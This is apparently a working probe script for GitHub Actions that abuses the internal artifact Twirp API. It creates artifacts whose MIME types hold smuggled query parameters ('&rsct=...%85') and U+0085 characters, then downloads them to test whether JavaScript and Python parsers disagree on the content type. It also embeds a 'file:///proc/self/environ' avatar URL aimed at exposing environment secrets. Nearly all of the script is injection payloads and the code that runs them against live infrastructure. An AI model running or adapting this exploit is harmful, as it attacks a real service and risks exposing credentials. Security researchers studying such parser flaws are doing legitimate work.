import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const twirp = internalArtifactTwirpClient();
const backend = getBackendIdsFromToken();
const repo = process.env.GITHUB_REPOSITORY;
const root = `https://api.github.com/repos/${repo}`;
const weird = '\u0085application/json';
const token = process.env.GITHUB_TOKEN;
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
const headers = {
  Authorization: `Bearer ${token}`,
  Accept: 'application/vnd.github.v3+json',
  'User-Agent': 'repo-cassette-transient-probe',
};

function payload(id) {
  return Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: { avatar_url: 'file:///proc/self/environ' },
  }));
}

async function create(name, version) {
  const mime = version === 6 ? weird : 'application/json';
  const result = await twirp.CreateArtifact({
    ...backend, name, version, mimeType: StringValue.create({ value: mime }),
  });
  console.log('CREATE_REPLY', JSON.stringify({version,keys:Object.keys(result),artifactId:result.artifactId??null}));
  if (!result.ok || !result.signedUploadUrl) throw Error(`Create v${version} failed`);
  return { version, url: result.signedUploadUrl, artifactId:result.artifactId??null };
}

async function upload(url, data) {
  const blob = new BlobClient(url).getBlockBlobClient();
  await blob.uploadData(data, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}

async function finalize(name, size) {
  const result = await twirp.FinalizeArtifact({ ...backend, name, size: String(size) });
  if (!result.ok || !result.artifactId) throw Error('Finalize failed');
  return String(result.artifactId);
}

async function inspect(id) {
  const first = await fetch(`${root}/actions/artifacts/${id}/zip`, {
    headers, redirect: 'manual', signal: AbortSignal.timeout(4000),
  });
  if (first.status !== 302) return { id, status: first.status };
  const location = first.headers.get('location');
  if (!location?.startsWith('https://')) return { id, status: first.status, error: 'no https location' };
  const response = await fetch(location, { signal: AbortSignal.timeout(4000) });
  const data = Buffer.from(await response.arrayBuffer());
  const ct = response.headers.get('content-type') ?? '';
  const head = ct.split(',')[0].split(';')[0];
  const js = head.trim().toLowerCase();
  const py = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '').toLowerCase();
  return {
    id, status: response.status, ct, match: data.equals(payload(id)),
    candidate: response.ok && data.equals(payload(id)) && js !== 'application/json' && py === 'application/json',
  };
}

async function remove(id) {
  const response = await fetch(`${root}/actions/artifacts/${id}`, {
    method: 'DELETE', headers, signal: AbortSignal.timeout(4000),
  });
  console.log('DELETE', JSON.stringify({ id, status: response.status }));
}




const cases=[
  'application/json; x="&rsct=application/json%85"',
  'application/json; x="&rsct=%85application/json"',
  'application/json; x="&response-content-type=application/json%85"',
  'application/json; boundary="foo&rsct=application/json%85"',
  'application/json; charset="utf-8&rsct=application/json%85"',
  'application/json; x="%26rsct%3Dapplication%2Fjson%2585"',
  'application/json; x="?rsct=application/json%85"',
  'application/json; x=";rsct=application/json%85"',
  'application/json; x="\\&rsct=application/json%85"',
];
for (let i=0;i<cases.length;i++) {
  const name=`mime-${process.env.GITHUB_RUN_ID}-${i}`;
  const mime=cases[i];
  try {
    const reply=await twirp.CreateArtifact({...backend,name,version:7,mimeType:StringValue.create({value:mime})});
    console.log('MIME_RESULT',JSON.stringify({i,mime,ok:reply.ok,keys:Object.keys(reply)}));
    if(reply.ok&&reply.signedUploadUrl){
      await upload(reply.signedUploadUrl,Buffer.from('{}'));
      const id=await finalize(name,2);
      const first=await fetch(`${root}/actions/artifacts/${id}/zip`,{headers,redirect:'manual'}); const loc=first.headers.get('location'); const u=loc?new URL(loc):null; console.log('MIME_DOWNLOAD',JSON.stringify({i,id,rsct:u?.searchParams.getAll('rsct')??[],...await inspect(id)}));
      await remove(id);
    }
  }catch(e){console.log('MIME_ERROR',JSON.stringify({i,mime,error:String(e).slice(0,180)}));}
}
console.log('MIME_SUMMARY',JSON.stringify({attempts:cases.length}));
process.exit(0);
